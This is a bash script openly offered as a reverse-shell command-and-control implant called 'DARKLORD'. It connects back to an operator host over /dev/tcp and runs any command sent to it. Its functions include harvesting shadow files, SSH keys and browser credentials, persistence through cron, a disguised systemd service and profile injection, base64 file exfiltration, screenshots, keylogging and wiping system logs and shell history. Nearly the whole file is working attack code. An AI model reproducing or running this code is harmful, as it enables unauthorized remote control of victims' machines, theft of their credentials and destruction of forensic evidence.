#!/bin/bash
# DARKLORD v9.1 - Lord0x | LordWare Elite C2 System
# Advanced Interactive Command & Control with Elite Features

{
# Elite Configuration
C2_VERSION="v9.1"
AUTHOR_TAG="Lord0x | LordWare"
SYSTEM_NAME="ShellKiller"
PROMPT_SIGNATURE="lord0x>"

# C2 Configuration - User Parameters
C2_SERVER="${1:-10.0.3.15}"
C2_PORT="${2:-4444}"
STEALTH_LEVEL="${3:-maximum}"

# Elite Command Handler
establish_elite_shell() {
    echo "[DARKLORD] Establishing elite C2 channel to $C2_SERVER:$C2_PORT..." >&2
    
    if command -v bash >/dev/null 2>&1; then
        bash -c "
exec 5<>/dev/tcp/$C2_SERVER/$C2_PORT

# Elite Banner
echo '╔══════════════════════════════════════════════╗' >&5
echo '║          DarkLord v9.1.0 - Lord0x            ║' >&5  
echo '║        Advanced RevShell bash script         ║' >&5
echo '║   Telegram: https://t.me/Official_LordWare   ║' >&5
echo '╚══════════════════════════════════════════════╝' >&5
echo '' >&5
echo '[+] Session Established: \$(date)' >&5
echo '[+] Target: \$(hostname) | User: \$(whoami) | PID: \$\$' >&5
echo '[+] Directory: \$(pwd)' >&5
echo '[+] Privilege Level: \$( [ \$EUID -eq 0 ] && echo 'ROOT' || echo 'USER' )' >&5
echo '' >&5

# Main command loop
while true; do
    echo -n '$PROMPT_SIGNATURE ' >&5
    read -u 5 user_command
    [ -z \"\$user_command\" ] && continue
    
    case \"\$user_command\" in
        \"help\"|\"?\")
            echo '' >&5
            echo '╔════════════════ DARKLORD ELITE COMMANDS ════════════════╗' >&5
            echo '║                   CORE OPERATIONS                       ║' >&5  
            echo '╠═════════════════════════════════════════════════════════╣' >&5
            echo '║ help | ?        - Show this elite command menu          ║' >&5
            echo '║ sysinfo         - Comprehensive system reconnaissance   ║' >&5
            echo '║ persist         - Deploy advanced persistence           ║' >&5
            echo '║ credits | loot  - Harvest credentials & sensitive data  ║' >&5
            echo '║ network | scan  - Network intelligence gathering        ║' >&5
            echo '║ pivot | lateral - Lateral movement & network discovery  ║' >&5
            echo '╠═════════════════════════════════════════════════════════╣' >&5
            echo '║                  ADVANCED FEATURES                      ║' >&5
            echo '╠═════════════════════════════════════════════════════════╣' >&5
            echo '║ download | dl   - Download file (base64 encoded)        ║' >&5
            echo '║ upload | ul     - Upload file to target                 ║' >&5
            echo '║ screenshot | ss - Capture screen (requires X11)         ║' >&5
            echo '║ keylog | keys   - Capture keystrokes (60 sec)           ║' >&5
            echo '║ clean | wipe    - Remove all forensic traces            ║' >&5
            echo '║ update | upgrade- Upgrade persistence mechanisms        ║' >&5
            echo '║ exit | quit     - Close C2 (persistence remains)        ║' >&5
            echo '╚═════════════════════════════════════════════════════════╝' >&5
            echo '' >&5
            echo '[+] Any other input executes as system command' >&5
            echo '[+] Use quotes for commands with spaces' >&5
            echo '' >&5
            ;;
            
        \"sysinfo\"|\"system\")
            echo '=== ELITE SYSTEM RECON ===' >&5
            echo '[*] Hostname: \$(hostname)' >&5
            echo '[*] OS: \$(uname -a)' >&5
            echo '[*] Kernel: \$(uname -r)' >&5
            echo '[*] Architecture: \$(arch)' >&5
            echo '[*] Uptime: \$(uptime)' >&5
            echo '' >&5
            echo '=== RESOURCE MONITOR ===' >&5
            echo 'Memory: \$(free -h | grep Mem | awk \"{print \\\$3\\\"/\\\"\\\$2}\")' >&5
            echo 'Disk: \$(df -h / | tail -1 | awk \"{print \\\$3\\\"/\\\"\\\$2}\")' >&5
            echo 'Load: \$(cat /proc/loadavg | awk \"{print \\\$1\\\", \\\$2\\\", \\\$3}\")' >&5
            ;;
            
        \"persist\"|\"persistence\")
            echo '[+] Deploying elite persistence mechanisms...' >&5
            # Deploy persistence directly
            elite_cmd=\"nohup bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null; sleep 45; done' >/dev/null 2>&1 &\"
            
            # Cron persistence
            if command -v crontab >/dev/null 2>&1; then
                (crontab -l 2>/dev/null | grep -v \"$C2_SERVER\"; echo \"*/7 * * * * \$elite_cmd\") | crontab - 2>/dev/null
                echo '  ✓ Cron persistence deployed' >&5
            fi
            
            # Systemd service
            if systemctl --version >/dev/null 2>&1; then
                service_name=\$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)
                cat > /etc/systemd/system/system-\$service_name.service << ELITE_SERVICE
[Unit]
Description=System Utilities Service
After=network.target
[Service]
Type=forking
ExecStart=/bin/bash -c \"\$elite_cmd\"
Restart=always
RestartSec=20
User=root
[Install]
WantedBy=multi-user.target
ELITE_SERVICE
                systemctl daemon-reload 2>/dev/null
                systemctl enable system-\$service_name.service 2>/dev/null
                systemctl start system-\$service_name.service 2>/dev/null
                echo \"  ✓ Systemd service deployed: system-\$service_name\" >&5
            fi
            echo '[+] Multi-vector persistence established' >&5
            ;;
            
        \"credits\"|\"loot\")
            echo '=== CREDENTIAL HARVESTING ===' >&5
            echo '[+] Scanning for password files...' >&5
            find /etc -name \"*pass*\" -o -name \"*shadow*\" -o -name \"*pwd*\" 2>/dev/null | head -20 >&5
            echo '' >&5
            echo '[+] SSH Keys Found:' >&5
            find /home /root -name \".ssh\" -type d 2>/dev/null | while read dir; do
                echo \"  \$dir:\" >&5
                ls -la \"\$dir/\" 2>/dev/null | grep -E \"(id_rsa|id_dsa|id_ecdsa)\" >&5
            done
            echo '' >&5
            echo '[+] Browser Credentials:' >&5
            find /home -name \"Login Data\" -o -name \"key3.db\" -o -name \"logins.json\" 2>/dev/null | head -10 >&5
            ;;
            
        \"network\"|\"scan\")
            echo '=== NETWORK INTELLIGENCE ===' >&5
            echo '[+] Network Interfaces:' >&5
            ip addr show 2>/dev/null | grep -E \"^[0-9]|inet \" | head -20 >&5
            echo '' >&5
            echo '[+] Active Connections:' >&5
            netstat -tunap 2>/dev/null | head -15 >&5
            echo '' >&5
            echo '[+] ARP Table:' >&5
            arp -a 2>/dev/null | head -10 >&5
            ;;
            
        \"pivot\"|\"lateral\")
            echo '[+] Initiating lateral movement scan...' >&5
            echo '=== NETWORK DISCOVERY ===' >&5
            for network in \$(ip route | grep -v default | awk '{print \$1}' | head -5); do
                echo \"Scanning: \$network\" >&5
                if command -v nmap >/dev/null 2>&1; then
                    nmap -sn \$network 2>/dev/null | grep \"Nmap scan\" | head -3 >&5
                else
                    ping -c 2 -W 1 \$network 2>/dev/null | grep \"bytes from\" | head -3 >&5
                fi
            done
            ;;
            
        \"download\"|\"dl\")
            echo -n '[?] Enter file path to download: ' >&5
            read -u 5 dl_file
            if [ -f \"\$dl_file\" ]; then
                echo '[+] Downloading file...' >&5
                base64 \"\$dl_file\" 2>/dev/null >&5
                echo '[DOWNLOAD_COMPLETE]' >&5
            else
                echo '[!] File not found or inaccessible' >&5
            fi
            ;;
            
        \"upload\"|\"ul\") 
            echo -n '[?] Enter destination path: ' >&5
            read -u 5 ul_path
            echo -n '[?] Enter base64 file data: ' >&5
            read -u 5 ul_data
            echo \"\$ul_data\" | base64 -d > \"\$ul_path\" 2>/dev/null
            if [ \$? -eq 0 ]; then
                echo '[+] File uploaded successfully' >&5
            else
                echo '[!] Upload failed' >&5
            fi
            ;;
            
        \"screenshot\"|\"ss\")
            echo '[+] Attempting screenshot capture...' >&5
            if command -v import >/dev/null 2>&1; then
                import -window root /tmp/.dl_ss.png 2>/dev/null
                base64 /tmp/.dl_ss.png 2>/dev/null >&5
                rm -f /tmp/.dl_ss.png
                echo '[SCREENSHOT_COMPLETE]' >&5
            else
                echo '[!] ImageMagick not available for screenshots' >&5
            fi
            ;;
            
        \"keylog\"|\"keys\")
            echo '[+] Activating keylogger for 60 seconds...' >&5
            timeout 60 bash -c '
                if command -v xinput >/dev/null 2>&1; then
                    xinput test-xi2 --root 3 2>/dev/null | while IFS= read -r line; do
                        if [[ \"\$line\" == *\"RawKeyPress\"* ]]; then
                            echo \"KEYLOG: \$line\" >&5
                        fi
                    done
                fi
            ' &
            echo '[+] Keylogger activated in background' >&5
            ;;
            
        \"clean\"|\"wipe\")
            echo '[+] Initiating forensic cleanup...' >&5
            echo '[+] Cleaning system logs...' >&5
            find /var/log -type f -exec sh -c 'echo \"\" > {}' \\; 2>/dev/null
            echo '[+] Clearing command history...' >&5
            history -c 2>/dev/null
            [ -f ~/.bash_history ] && rm -f ~/.bash_history
            echo '[+] Removing temporary artifacts...' >&5
            rm -rf /tmp/.dl_* /tmp/.f /tmp/.*.lock 2>/dev/null
            echo '[+] All forensic traces eliminated' >&5
            ;;
            
        \"update\"|\"upgrade\")
            echo '[+] Deploying system update persistence...' >&5
            elite_cmd=\"nohup bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null; sleep 45; done' >/dev/null 2>&1 &\"
            
            # Profile injection
            for profile in /etc/profile /etc/bash.bashrc ~/.bashrc ~/.profile; do
                if [ -f \"\$profile\" ]; then
                    grep -q \"$C2_SERVER\" \"\$profile\" || echo \"\$elite_cmd\" >> \"\$profile\"
                    echo \"  ✓ Profile persistence: \$profile\" >&5
                fi
            done
            echo '[+] System persistence upgraded' >&5
            ;;
            
        \"exit\"|\"quit\")
            echo '[!] Closing elite C2 channel...' >&5
            echo '[+] Persistence remains active' >&5
            break
            ;;
            
        *)
            # Execute as system command
            echo '[EXEC] \$user_command' >&5
            eval \"\$user_command\" >&5 2>&5
            echo '[END_EXEC]' >&5
            ;;
    esac
done

exec 5<&-
exec 5>&-
" &
        return 0
    fi
    return 1
}

# Elite Persistence System
deploy_elite_persistence() {
    local elite_cmd="nohup bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null; sleep 45; done' >/dev/null 2>&1 &"
    
    echo "[DARKLORD] Deploying multi-vector elite persistence..." >&2
    
    # Cron persistence
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$C2_SERVER"; echo "*/7 * * * * $elite_cmd") | crontab - 2>/dev/null
        echo "  ✓ Cron persistence deployed" >&2
    fi
    
    # Systemd service
    if systemctl --version >/dev/null 2>&1; then
        local service_name=$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)
        cat > /etc/systemd/system/system-${service_name}.service << ELITE_SERVICE
[Unit]
Description=System Utilities Service
After=network.target
[Service]
Type=forking
ExecStart=/bin/bash -c "$elite_cmd"
Restart=always
RestartSec=20
User=root
[Install]
WantedBy=multi-user.target
ELITE_SERVICE
        systemctl daemon-reload 2>/dev/null
        systemctl enable system-${service_name}.service 2>/dev/null
        systemctl start system-${service_name}.service 2>/dev/null
        echo "  ✓ Systemd service deployed: system-${service_name}" >&2
    fi
    
    # Profile injection
    for profile in /etc/profile /etc/bash.bashrc ~/.bashrc ~/.profile; do
        if [ -f "$profile" ]; then
            grep -q "$C2_SERVER" "$profile" || echo "$elite_cmd" >> "$profile"
            echo "  ✓ Profile persistence: $profile" >&2
        fi
    done
}

# Elite Initialization
elite_init() {
    exec >/dev/null 2>&1
    exec 2>/dev/null
    export HISTFILE=/dev/null
    export HISTSIZE=0
}

# Main Elite Execution
darklord_main() {
    if [ -z "$C2_SERVER" ] || [ -z "$C2_PORT" ]; then
        echo "Usage: $0 <C2_SERVER> <C2_PORT> [STEALTH_LEVEL]" >&2
        echo "Example: $0 10.0.3.15 4444 maximum" >&2
        return 1
    fi
    
    echo "[DARKLORD] Initializing Elite C2 System v9.1..." >&2
    echo "[DARKLORD] Target: $C2_SERVER:$C2_PORT | Stealth: $STEALTH_LEVEL" >&2
    
    elite_init
    deploy_elite_persistence
    
    if establish_elite_shell; then
        echo "[DARKLORD] Elite C2 Active - Awaiting commands at $PROMPT_SIGNATURE" >&2
        
        while true; do
            sleep 90
            if ! ps aux | grep -v grep | grep -q "$C2_SERVER:$C2_PORT"; then
                echo "[DARKLORD] Re-establishing C2 channel..." >&2
                establish_elite_shell &
            fi
        done
    fi
}

# Execution Guard
DARKLORD_LOCK="/tmp/.darklord_$(echo -n "$C2_SERVER$C2_PORT" | md5sum | cut -d' ' -f1)"
if [ ! -f "$DARKLORD_LOCK" ]; then
    touch "$DARKLORD_LOCK"
    darklord_main "$@" &
fi
} &

disown -a 2>/dev/null
exit 0
